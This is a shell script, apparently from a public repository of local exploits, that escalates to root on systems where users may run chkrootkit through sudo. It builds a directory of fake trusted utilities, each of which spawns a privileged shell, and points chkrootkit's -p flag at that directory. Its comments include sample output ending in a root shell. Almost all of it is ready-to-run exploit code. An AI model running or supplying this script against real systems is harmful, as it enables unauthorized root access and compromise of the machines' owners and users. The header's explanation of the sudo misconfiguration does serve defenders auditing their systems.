#!/bin/sh
# sudo-chkrootkit-root
#
# Sometimes administrators allow users to execute chkrootkit via sudo,
# as chkrootkit requires root privileges.
#
# This is unsafe, as chkrootkit offers a `-p` flag to specify a path to
# trusted system utilities (system utilities may have been compromised),
# allowing execution of arbitrary executables with root privileges.
#
# This exploit creates a directory containing the expected utilities,
# each of which spawns a shell when executed, and invokes chkrootkit
# via sudo with this directory path specified in the `-p` flag.
# ---
# sudo-chkrootkit-root
# [*] id: uid=1001(test) gid=1001(test) groups=1001(test)
# [*] Checking environment ...
# [*] Creating executables in /tmp/tmp.Fa1UgpRLun ...
# total 64
# drwx------  2 test test 4096 Mar 22 22:07 .
# drwxrwxrwt 36 root root 4096 Mar 22 22:07 ..
# -rwxr-xr-x  1 test test   31 Mar 22 22:07 awk
# -rwxr-xr-x  1 test test   31 Mar 22 22:07 cut
# -rwxr-xr-x  1 test test   31 Mar 22 22:07 echo
# -rwxr-xr-x  1 test test   31 Mar 22 22:07 egrep
# -rwxr-xr-x  1 test test   31 Mar 22 22:07 find
# -rwxr-xr-x  1 test test   31 Mar 22 22:07 head
# -rwxr-xr-x  1 test test   31 Mar 22 22:07 id
# -rwxr-xr-x  1 test test   31 Mar 22 22:07 ls
# -rwxr-xr-x  1 test test   31 Mar 22 22:07 netstat
# -rwxr-xr-x  1 test test   31 Mar 22 22:07 ps
# -rwxr-xr-x  1 test test   31 Mar 22 22:07 sed
# -rwxr-xr-x  1 test test   31 Mar 22 22:07 ssh
# -rwxr-xr-x  1 test test   31 Mar 22 22:07 strings
# -rwxr-xr-x  1 test test   31 Mar 22 22:07 uname
# [*] Launching /usr/sbin/chkrootkit ...
# /usr/sbin/chkrootkit: 2882: [: !=: unexpected operator
# /usr/sbin/chkrootkit: 2918: [: -ne: unexpected operator
# Checking `basename'... INFECTED
# Checking `cron'... INFECTED
# # id
# uid=0(root) gid=0(root) groups=0(root)
# ---
# <bcoles@gmail.com>
# https://github.com/bcoles/local-exploits/tree/master/sudo-chkrootkit-root

chkrootkit="/usr/sbin/chkrootkit"
sudo="/usr/bin/sudo"
sed="/bin/sed"

/bin/echo 'sudo-chkrootkit-root'

/bin/echo "[*] id: `/usr/bin/id`"

/bin/echo "[*] Checking environment ..."

deps="${chkrootkit} ${sudo} ${sed}"

for dep in $deps; do
  if ! command -v "${dep}" >/dev/null 2>/dev/null; then
    /bin/echo "[-] ${dep} is not installed"
    exit 1
  fi
done

if ! "${sudo}" "${chkrootkit}" -V 2>&1 | grep -q "chkrootkit version"; then
  /bin/echo '[-] User is not permitted to execute chkrootkit with sudo'
  exit 1
fi

executables="$(${sed} -n '/cmdlist="/,/"/p' "${chkrootkit}" | grep -vF '"')"

if [ -z "${executables}" ]; then
  /bin/echo "[-] Could not extract list of trusted executables from ${chkrootkit}"
  exit 1
fi

tmp="$(mktemp -d)"

/bin/echo "[*] Creating executables in ${tmp} ..."

for file in $executables; do
  /bin/echo '#!/bin/sh' > "${tmp}/${file}"
  /bin/echo 'exec /bin/sh -p 0<&1' >> "${tmp}/${file}"
  /bin/chmod +x "${tmp}/${file}"
done

/bin/ls -la "${tmp}"

/bin/echo "[*] Launching ${chkrootkit} ..."

"${sudo}" "${chkrootkit}" -q -p "${tmp}"

/bin/echo '[*] Cleaning up ...'
/bin/rm -rf "${tmp}"

